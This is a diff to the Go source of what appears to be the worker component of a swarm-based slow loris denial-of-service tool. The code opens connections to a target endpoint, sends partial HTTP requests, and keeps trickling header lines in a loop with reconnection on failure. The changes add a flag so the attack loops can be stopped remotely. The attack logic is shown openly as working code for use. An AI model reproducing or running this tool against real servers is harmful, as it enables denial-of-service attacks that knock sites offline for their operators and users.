@@ -21,6 +21,7 @@ type Worker struct {
       WorkerHeaders   *shared.Headers
       WorkerState     *shared.State
       WorkerAttackers []*shared.Attacker
+      Working         int
       doneChan        chan int
       exitChan        chan int
 }
@@ -39,6 +40,7 @@ func (worker *Worker) SetState(req *shared.State, res *int) error {
 }
 
 func (worker *Worker) Attack(req int, res *int) error {
+  worker.Working = 1
   // display slow loris attack information
   announceAttack(worker.WorkerState)
 
@@ -48,17 +50,18 @@ func (worker *Worker) Attack(req int, res *int) error {
   // dispatch goroutines to initiate attacks with each attacker in swarm
   go func() {
     for _, attacker := range worker.WorkerAttackers {
-      go loris(attacker, worker.WorkerState.Delay, worker.WorkerHeaders.Base, worker.WorkerHeaders.Loris, worker.WorkerState.Endpoint)
+      go worker.loris(attacker, worker.WorkerState.Delay, worker.WorkerHeaders.Base, worker.WorkerHeaders.Loris, worker.WorkerState.Endpoint)
     }
 
     // display system stats, waiting each time for the next round
     // of server writes
-    for {
+    for worker.Working == 1 {
           time.Sleep(time.Duration(worker.WorkerState.Delay) * time.Second)
           displayStats(worker.WorkerAttackers)
     }
   }()
   <-worker.doneChan
+  fmt.Println("unblocked")
   return nil
 }
 
@@ -67,6 +70,7 @@ func (worker *Worker) Attack(req int, res *int) error {
 // to call Terminate() to unblock Attack()
 func (worker *Worker) Terminate(req int, res *int) error {
   fmt.Println("TERMINATING")
+  worker.Working = 0
   worker.doneChan<-1
   *res = 0
   return nil
@@ -76,7 +80,7 @@ func (worker *Worker) Terminate(req int, res *int) error {
 func Initialize() *Worker {
   // create unbuffered blocking doneChan, will be used to block Attack()
   // from exiting until value sent to channel by Terminate()
-  worker := &Worker{Port: 3000, doneChan: make(chan int)}
+  worker := &Worker{Port: 3000, doneChan: make(chan int), Working: 1}
   return worker
 }
 
@@ -163,22 +167,22 @@ func createAttacker(endpoint string) net.Conn {
 
 // this function implements the slow loris attack, repeatadly writing to
 // the server for a given attacker connection, and
-func loris(worker *shared.Attacker, delay int, base []byte, header []byte, endpoint string) {
+func (worker *Worker) loris(attacker *shared.Attacker, delay int, base []byte, header []byte, endpoint string) {
   // initiate server request
-  if err := writeEndpoint(worker.Conn, base); err != nil {
-    fmt.Println("attacker", worker.Id, "failed to write to server")
+  if err := writeEndpoint(attacker.Conn, base); err != nil {
+    fmt.Println("attacker", attacker.Id, "failed to write to server")
   }
   // continuously write to server to prolong request
-  for {
+  for worker.Working == 1 {
     time.Sleep(time.Duration(delay) * time.Second)
-    if err := writeEndpoint(worker.Conn, header); err != nil {
-      worker.Errors += 1
-      worker.Active = 0
-      fmt.Println("error with repeat header, establishing connection #",worker.Errors)
-      worker.Conn = createAttacker(endpoint)
-      worker.Active = 1
+    if err := writeEndpoint(attacker.Conn, header); err != nil {
+      attacker.Errors += 1
+      attacker.Active = 0
+      fmt.Println("error with repeat header, establishing connection #",attacker.Errors)
+      attacker.Conn = createAttacker(endpoint)
+      attacker.Active = 1
     } else {
-      worker.Writes += 1
+      attacker.Writes += 1
     }
   }
 }
